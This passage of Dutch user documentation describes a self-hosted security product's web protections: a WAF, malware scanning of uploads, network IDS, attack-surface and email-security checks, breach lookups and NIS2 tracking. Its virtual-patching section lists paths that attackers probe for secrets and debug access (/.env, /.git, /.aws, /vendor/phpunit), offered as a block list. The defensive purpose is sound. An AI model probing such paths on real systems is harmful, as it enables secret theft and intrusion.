Wie wordt tegengehouden, ziet geen kale *403 Forbidden* maar een korte pagina met de reden, de site, het adres van de
bezoeker en de tijd. Antwoorden van de app zelf blijven zoals ze zijn.

Op de site van RzSense zelf staat op die pagina ook de knop **Toegang aanvragen**: een onbekend apparaat vraagt daar
met zijn naam toegang, en jij krijgt een melding om het toe te staan of te weigeren (zie
[Toegang en beheer](11-toegang-en-beheer.md)).

### Hoe de agent het veilig doet

- Hij schrijft alleen in **eigen bestanden**: SWAG `site-confs/rzsense-http.conf` en `rzsense/server.conf`; NPM
  `rzsense/http.conf` en `rzsense/server.conf`.
- In de proxy zet hij **één gemarkeerde regel** (`# rzsense-hook`): bij SWAG in `ssl.conf`, bij NPM in `custom/http.conf`
  en `custom/server_proxy.conf`. De rest van die bestanden blijft zoals het was.
- Eerst een **kopie**, dan **`nginx -t`** in de container, pas daarna **herladen**. Antwoordt een site daarna niet meer,
  dan zet hij **de vorige versie terug**.
- **Uit** (hoofdschakelaar, rol, of `PROXY_GUARD=0` op de server): de agent haalt de regel en zijn bestanden weg; je
  proxy is daarna zoals ervoor.
- Alles staat in het logboek.

In `/etc/default/rzmon-agent` op de proxyserver:

| Regel | Waarvoor |
|---|---|
| `PROXY_CTR` | welke container, als er meer zijn |
| `PROXY_HTTPS_PORT` | als je proxy niet op 443 luistert |
| `PROXY_CPATH` | de configmap zoals de container hem ziet |
| `PROXY_GUARD=0` | nooit iets aan de proxy doen |

### Statistieken

Bovenaan de pagina staat een inklapbaar blok over 24 uur, 7 of 30 dagen, voor alle sites of één site: verzoeken,
doorgelaten en tegengehouden (met de reden: WAF, dichte paden, alleen eigen netwerk, bots, rate limit, onbekende
hostnaam), statuscodes, een grafiek en de top van aangevallen paden, sites, landen en IP's. De agent stuurt hiervoor alleen
**tellingen** (paden zonder querystring), geen logregels. SWAG heeft daarvoor het extra logbestand nodig (zie
[Het hele pad van een webaanval](#het-hele-pad-van-een-webaanval)).

### Score per site

Elke site krijgt een score van 0 tot 100 (A ≥ 85, B ≥ 70, C ≥ 50, D daaronder). Klik op de score voor wat je kunt
verbeteren.

| Onderdeel | Punten | Volle punten als |
|---|---|---|
| Wie mag erbij | 25 | een beheerprogramma alleen vanaf je netwerk; adminpaden dicht bij een app |
| Rate limit | 10 | ruim, normaal of streng |
| Bots weren | 10 | aan |
| WAF | 25 | aan, op *streng* (*alleen zeker* 22, *detecteren* of *alleen melden* 12) |
| Bekende lekken | 15 | geen misbruik van een bekend lek (14 dagen) dat niet tegengehouden of dichtgezet is |
| Uploads scannen | 15 | ClamAV aan met een uploadmap voor deze site |

Een site die alleen vanaf je netwerk bereikbaar is, krijgt voor lekken en uploads de volle punten.

### Webcheck per site

RzSense vraagt elke site één keer per dag zelf op en geeft een cijfer van **A tot F** (kolom *Webcheck*, en in het
zijpaneel per onderdeel met **Opnieuw controleren**). Er gaat niets naar een externe dienst.

- **Punten** (samen 100): https met een geldig certificaat (20; 10 als het binnen 14 dagen verloopt), http stuurt door
  naar https (10), HSTS (15; 8 bij korter dan een half jaar), Content-Security-Policy (15; 8 met `unsafe-inline` zonder
  nonce of met `*`), niet in een frame van een andere site (10), `X-Content-Type-Options: nosniff` (10), Referrer-Policy
  (5), Permissions-Policy (5), geen softwareversies in `Server` of `X-Powered-By` (10).
- **Cijfer**: A vanaf 90, B 75, C 60, D 45, E 30, anders F. Werkt https niet of klopt het certificaat niet, dan altijd F.
- Bij namen als `app.*` (SWAG) vult RzSense het domein in uit het veld *Domein voor namen als naam.\** of anders het
  domein van RzSense. Draait RzSense op een IP-adres, dan neemt hij het domein over van een andere site van dezelfde proxy
  met een volledige naam (bv. `ha.example.nl`). Lukt geen van drieën, dan zegt de site dat in het zijpaneel en wordt hij
  niet gecontroleerd: vul dan het veld in.
- Aan of uit bij *Instellingen → Web en buitenkant → Reverse proxy en WAF*.

### WAF

Een *web application firewall* bekijkt elk verzoek naar je apps op aanvallen: SQL-injectie, misbruik van bekende lekken,
path traversal, scanners. RzSense gebruikt **CrowdSec AppSec**. De WAF werkt alleen met **SWAG**.

1. Zet bij *Reverse proxy en WAF → WAF* de **WAF aan**.
2. De agent start een eigen container **`rzsense-crowdsec`** in een eigen netwerk **`rzsense`** en hangt SWAG daaraan. De
   sleutel komt in `nginx/rzsense-waf/crowdsec.key` (alleen voor root) en gaat nooit naar RzSense.
3. Zet **één keer** bij SWAG deze omgevingsvariabelen en maak de SWAG-container opnieuw aan (RzSense toont ze ook bij de
   server zolang de koppeling ontbreekt):
   ```
   DOCKER_MODS=linuxserver/mods:swag-crowdsec
   FILE__CROWDSEC_API_KEY=/config/nginx/rzsense-waf/crowdsec.key
   CROWDSEC_LAPI_URL=http://rzsense-crowdsec:8080
   CROWDSEC_APPSEC_URL=http://rzsense-crowdsec:7422
   ```
   Heb je al een `DOCKER_MODS`, zet ze dan achter elkaar met een `|`. Start SWAG met `--network rzsense` (of laat de agent
   hem aan het netwerk hangen).
4. Daarna staat bij de server **✔ actief** en **✔ zelftest**: de agent stuurt elke ronde een nep-aanval vanaf een
   testadres en kijkt of de WAF doet wat hij moet.

| Stand van *Wat de WAF doet* | Wat er gebeurt |
|---|---|
| **Detecteren** (begin hier) | alles wordt gemeld, niets tegengehouden |
| **Verzoek tegenhouden (alleen zeker)** | alleen misbruik van bekende lekken (de virtuele patches van CrowdSec) krijgt 403; vrijwel nooit vals alarm |
| **Verzoek tegenhouden (streng)** | ook de brede OWASP-regels (CRS); meer bescherming, meer kans op vals alarm |

- Op de pagina zie je per site wat de WAF de laatste 14 dagen zag en hoeveel hij **zou tegenhouden** bij de andere
  standen. Zo zie je vooraf wat er verandert.
- **Afstellen per regel**: per WAF-regel en site hoe vaak hij afging. Vals alarm? Kies **⚙️ Overslaan op deze site**.
- De WAF houdt één *verzoek* tegen; *⛔ IP blokkeren* bij IDS houdt *alles* van dat IP tegen, op al je servers.
- Je eigen netwerk wordt nooit tegengehouden of gemeld. Elke echte melding wordt een IDS-incident (*webaanval*, per IP).
- **Delen met de CrowdSec-community** (standaard uit): aanvallende IP's doorgeven en hun lijst gebruiken.
- **Uit**: de agent haalt de container weg; `/var/lib/rzsense-crowdsec` blijft staan. Haal daarna de vier regels uit SWAG.
- Op de server: `WAF_DIR` (standaard `/var/lib/rzsense-crowdsec`) en `WAF_IMAGE`.

### AI-advies per site

De AI bekijkt je sites en wat de WAF zag, en stelt per site het beleid voor, met een reden.

1. Zet **AI-advies** aan en kies een model (*Instellingen → Systeem → AI-advies*).
2. Zet bij *Reverse proxy en WAF → AI-advies voor de instellingen per site* het advies aan.
3. Kies wie het doorvoert: **Zelf beheren** (standaard; jij kiest **Toepassen**, **Negeren** of **Alles toepassen**) of
   **Automatisch** (behalve bij sites die je zelf hebt ingesteld).

- **Wat de AI ziet**: per site een code en alleen het herkenbare deel van de naam (`nextcloud`, nooit je domein), de app,
  het beleid en wat de WAF zag. Bij een cloudmodel worden IP-adressen en servernamen gemaskeerd.
- **Wat de AI mag**: alleen keuzes uit vaste lijsten. RzSense controleert elke waarde; de AI voert nooit iets uit.
- Een site die de AI instelde, heeft het label **🤖 AI**. Pas je hem zelf aan, dan is hij weer van jou.
- Vanzelf als er een site bij komt of verdwijnt, en hooguit één keer per week als de WAF iets nieuws zag. Kosten en
  limieten zijn die van AI-advies.

### Uploads scannen op malware (ClamAV)

ClamAV scant wat er via je apps binnenkomt (uploads in Nextcloud, bijlagen, formulieren) op virussen, webshells,
macro-documenten en andere malware.

1. Zet bij *Reverse proxy en WAF → Uploads scannen op malware* **ClamAV aan**.
2. Is er genoeg geheugen vrij (standaard 1400 MB), dan start de agent de container **`rzsense-clamav`**. De eerste keer
   haalt ClamAV zijn definities op; dat duurt een paar minuten.
3. Kies op de pagina Reverse proxy (tabblad *Malware-scan*) de **uploadmappen**. Onder **Mappen per app** staan je
   containers met hun mappen: de map op de server en waar die in de app zit (bijvoorbeeld *in de app: /data*). Mappen die
   op uploads lijken, krijgen het label *uploads?*, en die apps staan meteen open. Klik bij een map op **＋ Toevoegen**;
   hij komt dan bij de site van die app. Je kunt ook zelf een map invullen bij *Zelf een map invullen*. Systeemmappen,
   databases en mappen buiten het plafond (`AV_DIRS_MAX`) staan er niet tussen.
4. De agent scant **elke minuut de nieuwe en gewijzigde bestanden** (tot 100 MB per bestand). **🔍 Volledige scan** scant
   alles op de achtergrond.

| Schakelaar | Aan | Uit |
|---|---|---|
| **Melden** | een vondst wordt een IDS-incident *Malware gevonden* | alleen in de lijst op de pagina Reverse proxy |
| **Verplaatsen** | het bestand gaat meteen naar de **quarantaine** | het bestand blijft staan |

- **Quarantaine**: `/var/lib/rzsense-clamav/quarantine/<id>`, alleen voor root, rechten 000. In het incident kies je
  **Terugzetten** (daarna niet opnieuw in quarantaine) of **Definitief weghalen**.
- ClamAV ziet de mappen alleen-lezen; alleen de agent verplaatst iets, en alleen binnen de gekozen mappen.
- `AV_DIRS_MAX` op de server bepaalt welke mappen mogen (standaard
  `/srv /opt /data /home /mnt /var/lib/docker/volumes /var/lib/containers/storage/volumes`). Systeemmappen (`/etc`,
  `/usr`, `/root` …) nooit.
- Staat de container stil (bv. na een herstart zonder `podman-restart.service`), dan start de agent hem opnieuw, hooguit
  elke 10 minuten, als er genoeg geheugen is.
- **Uit**: de container gaat weg; de quarantaine blijft.
- Dit scant direct ná het uploaden, niet aan de deur: een besmet bestand staat hooguit een minuut in de map.
- Op de server: `AV_DIR`, `AV_IMAGE`, `AV_MIN_MB`, `AV_MAX_MB` en `AV_DIRS_MAX`.

### Paden dichtzetten (virtual patching)

Heeft een app een bekend lek en kun je hem nog niet bijwerken? Zet het pad tijdelijk dicht: iedereen buiten je eigen
netwerk krijgt **403**.

- Op de pagina Reverse proxy, tabblad *Paden dicht*: kies hoe lang (7, 30 of 90 dagen, of zonder einde) en klik
  **🩹 Dichtzetten** bij een voorstel, of vul zelf een site (of *alle sites*) en een pad in.
- **Voorstellen** komen uit wat de WAF zag (misbruik van een bekend lek), uit paden die nooit open horen te staan
  (`/.env`, `/.git`, `/.svn`, `/.aws`, `/.DS_Store`, `/vendor/phpunit`, `/server-status`) en uit bekende paden per app
  (`/xmlrpc.php` bij WordPress, `/actuator` bij Spring Boot, `/script` bij Jenkins).
- Een pad is een **begin**: `/vendor/phpunit` zet ook alles daaronder dicht. Hoofdletters maken niet uit.
- **Weer open** of **+30 dagen** per regel. Een verlopen pad gaat vanzelf weer open.

### Suricata op het netwerk tussen proxy en apps

Tussen SWAG en je apps loopt het verkeer **onversleuteld** over de netwerkbrug van Podman of Docker. Suricata kijkt daar
mee: aanvallen die door de proxy en de WAF heen komen, en malware of cryptominers in je apps die naar buiten bellen.

1. Zet bij *Reverse proxy en WAF → Suricata op het netwerk tussen proxy en apps* **Suricata aan**.
2. Is er genoeg geheugen (ongeveer 800 MB), dan start de agent de container **`rzsense-suricata`**. Hij kijkt alleen mee
   en blokkeert zelf niets in het verkeer.
3. **Netwerkinterface** *auto* zoekt de bruggen van je proxycontainer. Werkt dat niet, vul dan zelf in, bv. `podman1` of
   `br-1a2b3c4d5e6f` (zie `ip link`), hooguit 4 met een komma.
4. De regels (**Emerging Threats Open**) worden de eerste keer binnen een paar minuten opgehaald, daarna elke dag.

| Instelling | Keuzes |
|---|---|
| **Regelprofiel** | *Web*, *Gebalanceerd* (ook malware, command-and-control, cryptominers, phishing; aanbevolen), *Alles* |
| **Melden vanaf ernst** | *1* alleen ernstig, *2* ernstig en middel (aanbevolen), *3* alles |

Meldingen worden IDS-incidenten, en volgen de blokkeer-instelling van [Suricata op een server](#suricata-op-een-server).
`eve.json` houdt de agent klein (boven 64 MB leeg). **Uit**: de container gaat weg. Op de server: `NIDS_DIR`,
`NIDS_IMAGE`, `NIDS_MIN_MB`, `NIDS_EVE_MB`.

## Van buitenaf: je aanvalsoppervlak

Wat staat er van je netwerk open op internet? Dat zie je bij *Netwerk → Van buitenaf* (alleen beheerders). De bronnen,
de doelen, hoe vaak en de melding stel je in bij *Instellingen → Web en buitenkant → Van buitenaf*.

**Doelen:**
- **Automatisch** (aan of uit): je eigen publieke IP-adres en de domeinen van je reverse proxy.
- **Zelf toevoegen**: openbare IP-adressen en domeinen, hooguit 50. Adressen uit je eigen netwerk kunnen niet.

**Bronnen** (elk aan of uit):

| Bron | Wat | Goed om te weten |
|---|---|---|
| **Shodan InternetDB** | wat Shodan de afgelopen weken zag: poorten, software, CVE's, labels | gratis; alleen je publieke IP-adressen gaan naar Shodan |
| **Vanuit RzSense zelf** | RzSense maakt naar elke poort een verbinding (standaard de 89 bekendste, of je eigen lijst, hooguit 2000) | gaat meestal via je router "rondje terug", dus niet altijd wat een aanvaller ziet |
| **Meetpunt van buitenaf** | een server met agent buiten je netwerk (VPS, Raspberry Pi bij familie) probeert dezelfde poorten | de eerlijkste blik; hooguit 50 seconden per rapport, dus houd de poortlijst kort |

**Wat je krijgt:**
- **Open op internet**: adres, poort, dienst, bron en sinds wanneer. Risicovolle diensten zijn rood (SSH, RDP, databases,
  Home Assistant, Proxmox, Docker API, Redis …).
- **✔ Hoort zo**: keur goed wat zo hoort, bv. 443 voor je reverse proxy. Dat geldt voor al je adressen.
- **Wat Shodan ziet** per IP, en **Weer dicht**: wat de laatste 30 dagen dicht ging.

**Meldingen** (aan of uit): de eerste scan is de beginstand. Daarna een melding bij elke **nieuwe** onverwachte poort:
critical bij een risicovolle dienst, anders warning. Ook bij nieuwe kwetsbaarheden die Shodan ziet.

**Hoe vaak**: van elk uur tot elke week, standaard elke 24 uur. **🔍 Nu bekijken** doet het meteen.

## E-mailbeveiliging van je domein

Kan iemand anders mail versturen die van jouw domein lijkt te komen? Dat hangt af van drie DNS-records: **SPF** (welke
servers mogen mailen), **DKIM** (een handtekening op elke mail) en **DMARC** (wat een ontvanger doet met mail die niet
klopt).

**Toevoegen:**
1. Kies een server (bv. die van RzSense) en klik **＋ Check**.
2. Type **Domein**, *Wat controleren*: **✉️ E-mailbeveiliging**.
3. Vul het domein in, en eventueel de **DKIM-selector** van je mailprovider (bv. `google` bij Google Workspace,
   `selector1` bij Microsoft 365; de bekendste probeert RzSense zelf).

RzSense controleert eens per 3 uur, met een score van 0 tot 100. **↻ Nu checken** doet het meteen.

| Punt | Goed | Niet goed |
|---|---|---|
| **SPF** | één record dat eindigt op `-all` of `~all`, hooguit 10 DNS-opzoekingen | geen SPF, meer dan één, `+all`, meer dan 10 opzoekingen → critical; `?all`, geen `all`, `ptr` → warning |
| **DMARC** | `p=quarantine` of `p=reject` | geen DMARC → critical; `p=none` of `pct` onder 100 → warning |
| **DKIM** | sleutel van 2048 bits (of ed25519) | geen sleutel of 1024 bits → warning |
| **MTA-STS** en **TLS-RPT** | `mode: enforce` en een rapportadres | ontbreekt → alleen info |
| **STARTTLS** (optioneel) | de mailserver versleutelt | geen STARTTLS → critical. Standaard uit: poort 25 is thuis vaak dicht |

- In het venster van de check staat per punt het DNS-record om bij je DNS-provider te plakken (📋).
- **Domein zonder mail**: vink *Dit domein verstuurt geen e-mail* aan (of RzSense ziet zelf dat er geen MX is). Dan hoort
  er `v=spf1 -all` en DMARC `p=reject` te staan.
- Vul je de naam van een mailserver in (`mail.voorbeeld.nl`), dan controleert RzSense het domein erboven. Met STARTTLS aan
  wordt die mailserver zelf getest (poort 25, vanaf de server van RzSense).
- Werkt DNS niet, dan wordt de check *onbekend*, niet *critical*.
- Uitzetten bij *Instellingen → Web en buitenkant → E-mailbeveiliging*.

## Datalekken (Have I Been Pwned)

RzSense controleert of **wachtwoorden** van RzSense-accounts en **e-mailadressen** in bekende datalekken staan, via
[Have I Been Pwned](https://haveibeenpwned.com) (HIBP). Instellen bij *Instellingen → Toegang tot RzSense →
Datalekken*; de gevonden lekken staan bij *IDS → Datalekken*. De hoofdschakelaar **Controle op datalekken** staat standaard uit; dan gaat er niets naar HIBP.

### Wachtwoorden (gratis)

- Het wachtwoord gaat **nooit** de deur uit: RzSense stuurt alleen de eerste 5 tekens van de SHA-1-hash en vergelijkt de
  rest zelf (*k-anonimiteit*).
- **Gelekt vanaf X keer**: standaard 1 (elke treffer).
- **Bij het instellen** van een gelekt wachtwoord krijg je een waarschuwing; opslaan mag wel.
- **Bij het inloggen** met een gelekt wachtwoord kom je eerst op het scherm *"Je wachtwoord staat in een datalek"*: kies
  een nieuw wachtwoord. Dat geldt voor iedereen, ook beheerders. Is HIBP niet bereikbaar, dan gaat alles gewoon door.
- Een wachtwoord wordt hooguit één keer per dag opnieuw gecontroleerd, bij het inloggen.

### E-mailadressen (API-sleutel)

1. Vul je **API-sleutel** in (te koop op [haveibeenpwned.com/API/Key](https://haveibeenpwned.com/API/Key)) en klik
   **🧪 Testen**: je ziet je abonnement en hoeveel verzoeken per minuut het toestaat.
2. Vul eventueel **extra e-mailadressen** (één per regel) en je **domein** in. Een domein moet je eerst op de site van HIBP
   verifiëren (*Domain search*); voor grotere domeinen is een groter abonnement nodig.

RzSense controleert dagelijks de adressen van gebruikers met de controle aan, de extra adressen en het domein, gespreid
binnen de limiet van je abonnement.

**Meldingen**: een warning bij een **nieuw lek met wachtwoorden**; een info-melding bij een nieuw lek zonder wachtwoorden,
en bij de eerste controle van een adres één samenvatting van de oude lekken. Kanalen bij *Instellingen → Meldingen en
rapporten → Systeemmeldingen → Datalek*.

### Resultaten en per account

- **Kwetsbaarheden → 🔓 Datalekken** (alleen beheerders): per adres de lekken met datum, aantal getroffen accounts, welke
  gegevens erin zaten (wachtwoorden in rood) en *Wat is er gebeurd?*. **✔ Afgehandeld** markeert een lek (bv. wachtwoord
  gewijzigd); **↺ Heropend** zet het terug. **🔍 Nu controleren** start meteen een ronde.
- Per account (*Gebruikers*) zet je de **🔓 Datalek-controle** aan of uit. Nieuwe accounts: aan. Staat hij uit, dan worden
  wachtwoord en e-mailadres van dat account niet gecontroleerd.
- Voor Home Assistant (MQTT) zijn er `sensor.rzmon_datalekken` en `binary_sensor.rzmon_gelekt_wachtwoord`.

## NIS2

Valt je organisatie onder de **NIS2-richtlijn** (in Nederland de Cyberbeveiligingswet), dan moet je passende maatregelen
nemen (artikel 21) en significante incidenten op tijd melden (artikel 23). RzSense helpt je dat bij te houden.

**Aanzetten**: *Compliance → Instellingen* (vul daar ook je organisatie in). Het overzicht staat op de pagina
**Compliance**.

**De tien maatregelen (a–j)**: risicoanalyse en beleid, incidentbehandeling, bedrijfscontinuïteit, toeleveringsketen,
veilig aanschaffen en onderhouden, beoordelen of het werkt, cyberhygiëne en training, cryptografie,
personeel/toegang/inventaris, en MFA en beveiligde communicatie. Per maatregel:
- **wat RzSense ziet** (✔ / ✘), met een link naar de plek waar je het regelt: hardening-score, IDS aan met een
  meldkanaal, back-ups, open actief misbruikte lekken, automatische updates, het maandrapport, https, 2FA per gebruiker;
- een **notitie** voor wat RzSense niet kan zien (beleid, afspraken met leveranciers, training);
- **zelf als geregeld markeren** als je het buiten RzSense regelde.

De status is *geregeld*, *deels* of *ontbreekt*. Wijzigingen komen in het logboek.

**Meldtermijnen (art. 23)**: kies onderaan een incident van de laatste 30 dagen en klik **Als significant markeren**.
RzSense telt af vanaf het moment dat het incident bekend was:
1. de **vroegtijdige waarschuwing**: binnen **24 uur**;
2. de **incidentmelding**: binnen **72 uur**;
3. het **eindverslag**: binnen **een maand** na de incidentmelding.

Vink per stap *verstuurd* aan. Komt een termijn binnen 6 uur (eindverslag: 3 dagen) of is hij verlopen, dan krijg je een
melding (*Instellingen → Meldingen en rapporten → Systeemmeldingen → NIS2*). Vul bij **CSIRT** in waar je meldt (het NCSC
of het CSIRT van je sector).

**Rapport**: *NIS2-rapport (afdrukken als PDF)* zet alles op één pagina. Automatisch versturen (standaard elk kwartaal,
of elke week of maand, naar eigen ontvangers) stel je in bij *Instellingen → Meldingen en rapporten → Rapporten →
🇪🇺 NIS2-overzicht*.

Dit is geen juridisch advies en geen certificering. Of je onder NIS2 valt en wat significant is, bepaal je zelf of met je
adviseur.

## Goed om te weten

- **Waar het werkt**: het IDS werkt op Linux-servers met de agent. Werk de agents bij met de knop in de Agent Manager.
  Voor Windows-servers zie [Windows-agent](06-windows-agent.md).
- **TrueNAS SCALE: alleen detecteren.** De firewall hoort daar bij TrueNAS zelf; de agent blokkeert er niets.
- **Niet in de Home Assistant-add-on.** Die draait in een container en ziet de gebruikers, bestanden, processen en
  firewall van Home Assistant OS niet. Zet voor Home Assistant `ip_ban_enabled: true` en `login_attempts_threshold` onder
  `http:` in `configuration.yaml`, en gebruik tweestapsverificatie. Zie ook [Home Assistant](07-home-assistant.md).
- De SUID-zoektocht draait één keer per uur en de pakketcontrole één keer per dag, met lage prioriteit. Container-opslag
  (`/var/lib/docker`, `/var/lib/containers`) wordt overgeslagen.
- Het IDS gebruikt de logins uit de journal of `/var/log/secure`. Dat werkt ook als *Toegang bijhouden* uit staat.
- Incidenten worden net zo lang bewaard als de meldingen.
- Een IDS ziet veel, maar niet alles. Houd je servers bijgewerkt, gebruik SSH-sleutels en zet `PermitRootLogin no`.
